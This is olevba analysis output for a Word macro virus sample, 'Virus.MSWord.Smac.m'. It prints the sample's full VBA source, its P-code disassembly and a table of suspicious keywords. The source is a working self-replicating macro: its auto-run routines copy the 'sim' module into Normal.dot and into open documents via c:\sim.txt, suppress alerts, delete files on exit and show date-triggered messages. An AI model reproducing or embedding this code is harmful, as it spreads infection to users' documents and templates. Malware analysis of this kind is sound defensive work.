olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Smac.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Smac.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sim.bas 
in file: ./Virus.MSWord.Smac.m - OLE stream: 'Macros/VBA/sim'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = True
Options.SaveNormalPrompt = True
Options.ConfirmConversions = True
CommandBars("Tools").Enabled = True
CommandBars("File").Enabled = True
CommandBars("Edit").Enabled = True
CommandBars("View").Enabled = True
CommandBars("Insert").Enabled = True
CommandBars("Format").Enabled = True
CommandBars("Table").Enabled = True
CommandBars("Window").Enabled = True
CommandBars("Help").Enabled = True
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "sim" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "sim" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Doc.VBProject.VBComponents("sim").Export ("c:\sim.txt")

If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.Import ("c:\sim.txt")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.Import ("c:\sim.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If

Label_Exit:
CommandBars("Tools").Enabled = True
CommandBars("File").Enabled = True
CommandBars("Edit").Enabled = True
CommandBars("View").Enabled = True
CommandBars("Insert").Enabled = True
CommandBars("Format").Enabled = True
CommandBars("Table").Enabled = True
CommandBars("Window").Enabled = True
CommandBars("Help").Enabled = True
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub AutoClose()
On Error Resume Next
If Day(Now) = 2 And Month(Now) = 9 Then MsgBox "Emmie was here!", vbCritical
Application.DisplayAlerts = wdAlertsNone
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "sim" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "sim" Then ActiveInstall = True
Next i
If ActiveInstall = True And NormInstall = True Then GoTo Label_Exit
If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.Import ("c:\sim.txt")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.Import ("c:\sim.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Label_Exit:
End Sub

Public Sub AutoExec()
On Error Resume Next
CommandBars("Tools").Enabled = True
CommandBars("File").Enabled = True
CommandBars("Edit").Enabled = True
CommandBars("View").Enabled = True
CommandBars("Insert").Enabled = True
CommandBars("Format").Enabled = True
CommandBars("Table").Enabled = True
CommandBars("Window").Enabled = True
CommandBars("Help").Enabled = True
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
Options.VirusProtection = True
End Sub
Sub AutoExit()
On Error Resume Next
Kill ("c:\sim.txt")
Kill ("c:\dumplog.txt")
If Day(Now) = 13 Then MsgBox "Emmie was here!", vbCritical
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Smac.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/sim - 5214 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #5:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #8:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #9:
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Table"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #12:
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Window"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #13:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "sim"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "sim"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #21:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Doc 
' 	EndIf 
' Line #22:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Doc 
' 	EndIf 
' Line #23:
' 	LitStr 0x000A "c:\sim.txt"
' 	Paren 
' 	LitStr 0x0003 "sim"
' 	Ld Doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #24:
' Line #25:
' 	Ld ActiveInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #26:
' 	LitStr 0x000A "c:\sim.txt"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #27:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Dname 
' Line #30:
' 	Ld Dname 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #31:
' 	LitStr 0x000A "c:\sim.txt"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #33:
' 	EndIfBlock 
' Line #34:
' Line #35:
' 	Label Label_Exit 
' Line #36:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #37:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #38:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #39:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #40:
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #41:
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #42:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Table"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #43:
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Window"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #44:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #45:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #46:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #47:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub AutoClose())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Emmie was here!"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #52:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #54:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "sim"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #57:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "sim"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActiveInstall 
' 	EndIf 
' Line #58:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	Ld ActiveInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #60:
' 	Ld ActiveInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #61:
' 	LitStr 0x000A "c:\sim.txt"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #62:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #63:
' 	ElseBlock 
' Line #64:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Dname 
' Line #65:
' 	Ld Dname 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #66:
' 	LitStr 0x000A "c:\sim.txt"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #67:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	Label Label_Exit 
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' 	FuncDefn (Public Sub AutoExec())
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #75:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #76:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #77:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #78:
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #79:
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #80:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Table"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #81:
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Window"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #82:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #83:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #84:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #85:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub AutoExit())
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	LitStr 0x000A "c:\sim.txt"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #90:
' 	LitStr 0x000E "c:\dumplog.txt"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #91:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Emmie was here!"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

